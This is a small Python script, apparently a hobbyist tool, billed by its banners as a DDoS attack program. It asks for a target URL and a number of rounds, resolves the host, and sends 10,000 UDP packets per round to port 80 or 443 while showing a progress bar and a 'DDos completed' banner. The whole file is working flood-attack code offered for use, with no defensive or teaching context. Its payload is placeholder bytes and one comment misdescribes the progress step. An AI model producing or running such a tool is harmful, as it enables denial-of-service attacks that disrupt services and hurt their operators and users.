import urllib.parse
from rich.console import Console
from rich.progress import Progress
import socket
import time

console = Console()

logo = """
           _    __         _   _             _
 __      _| |_ / _|   __ _| |_| |_ __ _  ___| | __
 \ \ /\ / / __| |_   / _` | __| __/ _` |/ __| |/ /
  \ V  V /| |_|  _| | (_| | |_| || (_| | (__|   <
   \_/\_/  \__|_|    \__,_|\__|\__\__,_|\___|_|\_\\
"""

finish = """
  ____  ____                                        _      _           _ 
 |  _ \|  _ \  ___  ___    ___ ___  _ __ ___  _ __ | | ___| |_ ___  __| |
 | | | | | | |/ _ \/ __|  / __/ _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \/ _` |
 | |_| | |_| | (_) \__ \ | (_| (_) | | | | | | |_) | |  __/ ||  __/ (_| |
 |____/|____/ \___/|___/  \___\___/|_| |_| |_| .__/|_|\___|\__\___|\__,_|
                                             |_|                         """
print(logo)

url = input("DDos URL:")
rounds = int(input("Number of rounds:"))  # Number of rounds
visits_per_round = 10000

def DDos(url, rounds, visits_per_round):
    try:
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.hostname
        ip = socket.gethostbyname(host)

        if parsed_url.scheme == 'http':
            port = 80
        elif parsed_url.scheme == 'https':
            port = 443
        else:
            port = 0

        total_rounds = rounds * visits_per_round

        with Progress() as progress:
            task = progress.add_task("DDosing...", total=total_rounds)

            for round_number in range(rounds):
                Dog = 0  # Reset Dog for each round

                for _ in range(visits_per_round):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(b'your_byte_data', (ip, port))  # Replace 'your_byte_data' with actual bytes
                    Dog += 1

                    # Update progress by 1% for each visit
                    progress.update(task, advance=1)

                    sock.close()

                # Print information after each round
                print(f"Round {round_number + 1} completed")
                print(f"{Dog} DDos sent in round {round_number + 1}")

        print(finish)
        time.sleep(5)

    except Exception as e:
        print(f"Error: {e}")

DDos(url, rounds, visits_per_round)
